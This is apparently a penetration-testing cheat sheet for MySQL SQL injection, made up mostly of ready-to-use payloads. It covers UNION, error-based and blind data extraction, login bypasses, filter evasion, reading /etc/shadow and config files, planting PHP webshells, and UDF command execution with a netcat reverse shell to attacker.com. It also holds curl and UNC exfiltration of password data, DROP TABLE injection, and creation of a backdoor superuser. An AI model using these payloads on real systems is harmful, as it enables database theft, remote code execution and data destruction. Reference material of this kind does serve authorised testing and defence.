# MySQL SQL Injection

## Version Detection

```sql
SELECT @@version
SELECT version()
SELECT @@version_comment
```

## Information Gathering

### Current Context

| Query                         | Description      |
| ----------------------------- | ---------------- |
| `SELECT user()`               | Current user     |
| `SELECT current_user()`       | Current user     |
| `SELECT system_user()`        | System user      |
| `SELECT database()`           | Current database |
| `SELECT schema()`             | Current schema   |
| `SELECT @@hostname`           | Server hostname  |
| `SELECT @@datadir`            | Data directory   |
| `SELECT @@basedir`            | Base directory   |
| `SELECT @@plugin_dir`         | Plugin directory |
| `SELECT @@version_compile_os` | OS               |
| `SELECT CONNECTION_ID()`      | Connection ID    |

### Database Enumeration

```sql
-- List databases
SELECT schema_name FROM information_schema.schemata
SELECT DISTINCT table_schema FROM information_schema.tables

-- List tables
SELECT table_name FROM information_schema.tables WHERE table_schema=database()
SELECT table_name FROM information_schema.tables WHERE table_schema='dbname'

-- List columns
SELECT column_name FROM information_schema.columns WHERE table_name='users'
SELECT column_name,data_type FROM information_schema.columns WHERE table_name='users' AND table_schema=database()

-- Count tables
SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()

-- Tables by column name
SELECT table_schema,table_name FROM information_schema.columns WHERE column_name='password'
```

### User Information

```sql
-- List users
SELECT user,host FROM mysql.user

-- Password hashes (MySQL < 5.7)
SELECT user,password FROM mysql.user

-- Password hashes (MySQL >= 5.7)
SELECT user,authentication_string FROM mysql.user

-- Current privileges
SELECT * FROM information_schema.user_privileges WHERE grantee LIKE CONCAT("'",USER(),"'%")

-- Check specific privilege
SELECT grantee,privilege_type FROM information_schema.user_privileges WHERE privilege_type='FILE'

-- Check if user has FILE privilege
SELECT file_priv FROM mysql.user WHERE user=SUBSTRING_INDEX(USER(),'@',1)
```

## String Functions

| Function    | Example                  | Result       |
| ----------- | ------------------------ | ------------ |
| Concat      | `CONCAT('a','b')`        | `ab`         |
| `SUBSTRING` | `SUBSTRING('hello',1,3)` | `hel`        |
| `SUBSTR`    | `SUBSTR('hello',1,3)`    | `hel`        |
| `MID`       | `MID('hello',1,3)`       | `hel`        |
| `LEFT`      | `LEFT('hello',2)`        | `he`         |
| `RIGHT`     | `RIGHT('hello',2)`       | `lo`         |
| `LENGTH`    | `LENGTH('hello')`        | `5`          |
| `CHAR`      | `CHAR(65)`               | `A`          |
| `ASCII`     | `ASCII('A')`             | `65`         |
| `ORD`       | `ORD('A')`               | `65`         |
| `HEX`       | `HEX('hello')`           | `68656C6C6F` |
| `UNHEX`     | `UNHEX('68656C6C6F')`    | `hello`      |

### String Aggregation (Concatenating Multiple Rows)

**⚠️ Important:** `CONCAT()` only accepts **scalar values**, NOT subqueries that return multiple rows!

#### ❌ WRONG - This will fail:

```sql
SELECT CONCAT((SELECT table_name FROM information_schema.tables))
-- Error: Subquery returns more than 1 row
```

#### ✅ CORRECT - Use GROUP_CONCAT():

```sql
-- Method 1: GROUP_CONCAT() - Recommended
SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()

-- With custom separator
SELECT GROUP_CONCAT(table_name SEPARATOR ',') FROM information_schema.tables WHERE table_schema=database()

-- With multiple columns
SELECT GROUP_CONCAT(CONCAT(username,':',password) SEPARATOR '|') FROM users

-- With ORDER BY
SELECT GROUP_CONCAT(table_name ORDER BY table_name SEPARATOR ',') FROM information_schema.tables

-- In UNION context:
' UNION SELECT 1,GROUP_CONCAT(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT 1,GROUP_CONCAT(column_name),3,4 FROM information_schema.columns WHERE table_name='users'--
```

#### Common Use Cases:

```sql
-- List all databases
SELECT GROUP_CONCAT(schema_name SEPARATOR ',') FROM information_schema.schemata

-- List all tables
SELECT GROUP_CONCAT(table_name SEPARATOR ',') FROM information_schema.tables WHERE table_schema=database()

-- List all columns from a table
SELECT GROUP_CONCAT(column_name SEPARATOR ',') FROM information_schema.columns WHERE table_name='users'

-- Extract data from multiple rows
SELECT GROUP_CONCAT(CONCAT(username,':',password) SEPARATOR '|') FROM users

-- List all databases with table count
SELECT GROUP_CONCAT(CONCAT(schema_name,'(',COUNT(*),')')  SEPARATOR ',')
FROM information_schema.tables GROUP BY table_schema
```

#### Handling GROUP_CONCAT Length Limit:

```sql
-- Default limit is 1024 bytes, can be increased
SET SESSION group_concat_max_len = 1000000;

-- Or use LIMIT in subquery
SELECT GROUP_CONCAT(table_name) FROM (SELECT table_name FROM information_schema.tables LIMIT 100) t
```

## Comment Syntax

```sql
-- Single line (MySQL specific)
SELECT 1-- comment
SELECT 1# comment
SELECT 1/*comment*/

-- Inline comments
SEL/**/ECT 1
SELECT/*comment*/1

-- Version-specific comments (execute only in specific versions)
/*!50001 SELECT 1*/
/*!50001 DROP TABLE users*/

-- MySQL-specific execution
/*!50001 UNION*/ SELECT 1
```

## Stacked Queries

MySQL **does NOT support** stacked queries in most contexts (PHP mysqli_query, Python MySQLdb, etc.).

**Exception:** If application uses `mysqli_multi_query()` or `mysql_query()` (old PHP), stacked queries work:

```sql
SELECT 1; SELECT 2; SELECT 3
'; DROP TABLE users--
'; INSERT INTO users VALUES('hacker','pass')--
```

## Conditional Statements

```sql
-- IF
SELECT IF(1=1,'true','false')
SELECT IF(1=2,'true','false')

-- CASE
SELECT CASE WHEN 1=1 THEN 'true' ELSE 'false' END

-- IFNULL
SELECT IFNULL(NULL,'default')

-- NULLIF
SELECT NULLIF(1,1)  -- Returns NULL if equal

-- ELT (returns Nth element)
SELECT ELT(1,'a','b','c')  -- Returns 'a'
```

## Time Delays

```sql
-- SLEEP (most common)
SELECT SLEEP(5)
'; SELECT SLEEP(5)--
' AND SLEEP(5)--
' OR SLEEP(5)--

-- With condition
SELECT IF(1=1, SLEEP(5), 0)
' AND IF(1=1, SLEEP(5), 0)--
' AND IF(SUBSTRING(database(),1,1)='w', SLEEP(5), 0)--

-- BENCHMARK (CPU intensive alternative)
SELECT BENCHMARK(10000000, SHA1('test'))
' AND BENCHMARK(10000000, SHA1('test'))--
' AND IF(1=1, BENCHMARK(10000000, SHA1('test')), 0)--

-- Heavy query method
SELECT COUNT(*) FROM information_schema.tables t1, information_schema.tables t2, information_schema.tables t3
```

## Error-based Extraction

### EXTRACTVALUE / UPDATEXML (MySQL 5.1+)

```sql
-- EXTRACTVALUE (most reliable)
SELECT EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()), 0x7e))
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database())))--
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())))--

-- UPDATEXML
SELECT UPDATEXML(1, CONCAT(0x7e, (SELECT database()), 0x7e), 1)
' AND UPDATEXML(1, CONCAT(0x7e, (SELECT user())), 1)--

-- Extract longer data (32 char limit workaround)
' AND EXTRACTVALUE(1, CONCAT(0x7e, SUBSTRING((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables),1,32)))--
' AND EXTRACTVALUE(1, CONCAT(0x7e, SUBSTRING((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables),33,64)))--
```

### Other Error-based Methods

```sql
-- Duplicate entry error (Double query)
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)y)--

-- Geometric functions (MySQL 5.x)
' AND GeometryCollection((SELECT * FROM (SELECT * FROM(SELECT user())a)b))--
' AND polygon((SELECT * FROM(SELECT * FROM(SELECT user())a)b))--
' AND multipoint((SELECT * FROM(SELECT * FROM(SELECT user())a)b))--
' AND multilinestring((SELECT * FROM(SELECT * FROM(SELECT user())a)b))--
' AND multipolygon((SELECT * FROM(SELECT * FROM(SELECT user())a)b))--
' AND linestring((SELECT * FROM(SELECT * FROM(SELECT user())a)b))--

-- EXP overflow (MySQL >= 5.5.5)
' AND EXP(~(SELECT * FROM (SELECT user())a))--

-- BigInt overflow (MySQL >= 5.5.5)
' AND (SELECT 2147483647)-(SELECT 2147483647)-(SELECT (SELECT user()))--
```

## UNION Attacks

```sql
-- Detect number of columns
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--  (until error)

-- Or use UNION SELECT
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--  (until no error)

-- Extract data
' UNION SELECT 1,2,3,4--
' UNION SELECT 1,@@version,database(),user()--
' UNION SELECT 1,GROUP_CONCAT(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT 1,GROUP_CONCAT(column_name),3,4 FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT 1,GROUP_CONCAT(CONCAT(username,':',password)),3,4 FROM users--
```

## Blind Extraction

### Boolean-based

```sql
-- Character by character
' AND SUBSTRING(database(),1,1)='w'--
' AND ASCII(SUBSTRING(database(),1,1))=119--
' AND ORD(SUBSTRING(database(),1,1))>100--

-- Length check
' AND LENGTH(database())=7--
' AND LENGTH((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()))>50--

-- Check existence
' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>5--
' AND (SELECT 1 FROM users WHERE username='admin')=1--
```

### Time-based

```sql
-- Basic time-based
' AND IF(1=1, SLEEP(5), 0)--
' AND IF(1=2, SLEEP(5), 0)--

-- Extract database name
' AND IF(SUBSTRING(database(),1,1)='w', SLEEP(5), 0)--
' AND IF(ASCII(SUBSTRING(database(),1,1))>100, SLEEP(5), 0)--

-- Extract table names
' AND IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>5, SLEEP(5), 0)--
' AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)='u', SLEEP(5), 0)--

-- Extract data
' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a', SLEEP(5), 0)--
```

## File Operations

### Read Files (requires FILE privilege)

```sql
-- LOAD_FILE
SELECT LOAD_FILE('/etc/passwd')
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4--
' UNION SELECT 1,LOAD_FILE('/var/www/html/config.php'),3,4--
' UNION SELECT 1,LOAD_FILE('C:\\Windows\\win.ini'),3,4--

-- Hex encode to avoid encoding issues
' UNION SELECT 1,HEX(LOAD_FILE('/etc/passwd')),3,4--

-- Common files to read
/etc/passwd
/etc/shadow
/etc/my.cnf
/var/www/html/config.php
C:\Windows\win.ini
C:\xampp\htdocs\config.php
```

### Write Files (requires FILE privilege and secure_file_priv=NULL)

```sql
-- INTO OUTFILE
SELECT 'test' INTO OUTFILE '/tmp/test.txt'
' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3,4 INTO OUTFILE '/var/www/html/shell.php'--
' UNION SELECT 1,'<? system($_GET[cmd]); ?>',3,4 INTO OUTFILE 'C:\\xampp\\htdocs\\shell.php'--

-- INTO DUMPFILE (no formatting, binary-safe)
SELECT 'test' INTO DUMPFILE '/tmp/test.txt'
' UNION SELECT 1,0x3C3F706870206576616C28245F504F53545B636D645D293B203F3E,3,4 INTO DUMPFILE '/var/www/html/shell.php'--

-- Check secure_file_priv
SELECT @@secure_file_priv
-- Empty = no restriction
-- NULL = disabled
-- /path/ = only that directory
```

### LOAD DATA INFILE

```sql
-- Load file into table
CREATE TABLE temp(data TEXT);
LOAD DATA INFILE '/etc/passwd' INTO TABLE temp;
SELECT * FROM temp;

-- With SQLi
'; CREATE TABLE x(d TEXT); LOAD DATA INFILE '/etc/passwd' INTO TABLE x; SELECT * FROM x--
```

## OS Command Execution

### User Defined Functions (UDF)

Requires:

- FILE privilege
- Plugin directory writable
- Ability to load libraries

**Steps:**

1. Upload compiled library (`.so` on Linux, `.dll` on Windows):

```sql
-- Create table to hold binary
CREATE TABLE udf_data(data LONGBLOB);

-- Insert library in hex
INSERT INTO udf_data VALUES (0x7f454c46...);

-- Export to plugin directory
SELECT data FROM udf_data INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';
```

2. Create function:

```sql
CREATE FUNCTION sys_exec RETURNS STRING SONAME 'udf.so';
```

3. Execute:

```sql
SELECT sys_exec('id');
SELECT sys_exec('nc -e /bin/bash attacker.com 4444');
```

### Pre-compiled UDF Libraries

**Linux:**

- `lib_mysqludf_sys.so` (sqlmap: `/usr/share/sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so_`)

**Windows:**

- `lib_mysqludf_sys.dll` (sqlmap: `/usr/share/sqlmap/data/udf/mysql/windows/32/lib_mysqludf_sys.dll_`)

**Functions:**

- `sys_exec(command)` - Execute command (no output)
- `sys_eval(command)` - Execute and return output

### INTO OUTFILE for Webshell

Simplest RCE if web directory writable:

```sql
' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3,4 INTO OUTFILE '/var/www/html/shell.php'--
-- Access: http://target/shell.php?cmd=id
```

## Out-of-Band (DNS/HTTP)

MySQL doesn't have built-in DNS/HTTP functions. Use UDF or LOAD_FILE with UNC paths (Windows only):

```sql
-- Windows UNC path (SMB)
SELECT LOAD_FILE('\\\\attacker.com\\share\\file')
' AND LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\a'))--

-- HTTP with UDF (if sys_eval available)
SELECT sys_eval(CONCAT('curl http://attacker.com/?data=',(SELECT password FROM users LIMIT 1)))
```

## Authentication Bypass

```sql
-- Classic bypasses
admin'--
admin'#
' OR '1'='1
' OR 1=1--
' OR 1=1#
' OR '1'='1'--
' OR '1'='1'#
admin' OR '1'='1
admin' OR 1=1--

-- Special characters
admin'/*
'||'1'='1
'||'a'='a

-- Case variations
AdMiN'--
ADMIN'--
```

## Bypassing WAF/Filters

```sql
-- Case variation
SeLeCt, UniOn, FrOm

-- Inline comments
SEL/**/ECT
UN/**/ION SE/**/LECT
SELECT/*!32302table_name*/FROM/**/information_schema.tables

-- Alternative functions
SUBSTR vs SUBSTRING vs MID
ASCII vs ORD
CONCAT vs CONCAT_WS

-- Hex encoding
SELECT 0x61646D696E  -- 'admin'
' OR username=0x61646D696E--

-- Char function
SELECT CHAR(97,100,109,105,110)  -- 'admin'

-- Whitespace alternatives
SELECT/**/1
SELECT%091  -- tab
SELECT%0A1  -- newline
SELECT%0D1  -- carriage return

-- Operator alternatives
' AND 1=1
' && 1=1
' %26%26 1=1
' || 1=1

-- Scientific notation
1e0 = 1
2e0 = 2
```

## Privilege Escalation

```sql
-- Create new user with all privileges
CREATE USER 'attacker'@'%' IDENTIFIED BY 'password';
GRANT ALL PRIVILEGES ON *.* TO 'attacker'@'%' WITH GRANT OPTION;
FLUSH PRIVILEGES;

-- Grant FILE privilege (for LOAD_FILE/INTO OUTFILE)
GRANT FILE ON *.* TO 'existing_user'@'localhost';

-- Check privileges
SELECT * FROM mysql.user WHERE user='username';
SHOW GRANTS FOR 'username'@'localhost';
```

## Quick Payload Reference

```sql
-- Auth bypass
admin'--
' OR 1=1--
' OR '1'='1

-- Union
' UNION SELECT NULL--
' UNION SELECT 1,2,3,4--
' UNION SELECT 1,@@version,database(),user()--
' UNION SELECT 1,GROUP_CONCAT(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()--

-- Error-based
' AND EXTRACTVALUE(1, CONCAT(0x7e, database()))--
' AND UPDATEXML(1, CONCAT(0x7e, user()), 1)--
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)y)--

-- Boolean blind
' AND SUBSTRING(database(),1,1)='w'--
' AND ASCII(SUBSTRING(user(),1,1))>100--

-- Time-based
' AND SLEEP(5)--
' AND IF(1=1, SLEEP(5), 0)--
' AND IF(SUBSTRING(database(),1,1)='w', SLEEP(5), 0)--

-- File read
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4--

-- File write (webshell)
' UNION SELECT 1,'<?php system($_GET[0]); ?>',3,4 INTO OUTFILE '/var/www/html/s.php'--

-- Stacked (if supported)
'; DROP TABLE users--
'; INSERT INTO users VALUES('hacker','pass')--
```

## Useful System Tables

```sql
-- information_schema (available in MySQL 5+)
information_schema.schemata           -- Databases
information_schema.tables             -- Tables
information_schema.columns            -- Columns
information_schema.user_privileges    -- User privileges
information_schema.table_constraints  -- Constraints (PK, FK)

-- mysql database (requires privileges)
mysql.user                            -- User accounts and passwords
mysql.db                              -- Database privileges
mysql.tables_priv                     -- Table privileges
mysql.columns_priv                    -- Column privileges
```

## MySQL Version Differences

### MySQL 5.x

- `information_schema` available
- Error-based with `EXTRACTVALUE`/`UPDATEXML`
- No JSON functions

### MySQL 8.x

- Improved security (caching_sha2_password default)
- `information_schema` improvements
- JSON functions available
- CTEs (Common Table Expressions) available

```sql
-- JSON functions (MySQL 5.7+/8.x)
SELECT JSON_EXTRACT('{"key":"value"}', '$.key')
SELECT JSON_ARRAYAGG(table_name) FROM information_schema.tables

-- CTE (MySQL 8.x)
WITH RECURSIVE cte AS (SELECT 1) SELECT * FROM cte
```

## Detection Hints

```
Error patterns:
- "You have an error in your SQL syntax"
- "Warning: mysql_fetch_array()"
- "MySQL server version for the right syntax"
- "Unclosed quotation mark after the character string"

Application hints:
- PHP applications commonly use MySQL
- WordPress, Joomla, Drupal all use MySQL
- LAMP stack (Linux, Apache, MySQL, PHP)
```

## Common Secure Configurations to Check

```sql
-- Check if FILE privilege disabled
SELECT file_priv FROM mysql.user WHERE user=current_user()

-- Check secure_file_priv (restricts LOAD_FILE/INTO OUTFILE)
SELECT @@secure_file_priv
-- NULL = disabled completely
-- '' = no restriction (vulnerable)
-- '/path/' = restricted to path

-- Check if local_infile disabled
SELECT @@local_infile
-- 0 = disabled (secure)
-- 1 = enabled (potential risk)

-- Check if logging enabled
SELECT @@general_log
SELECT @@general_log_file
```
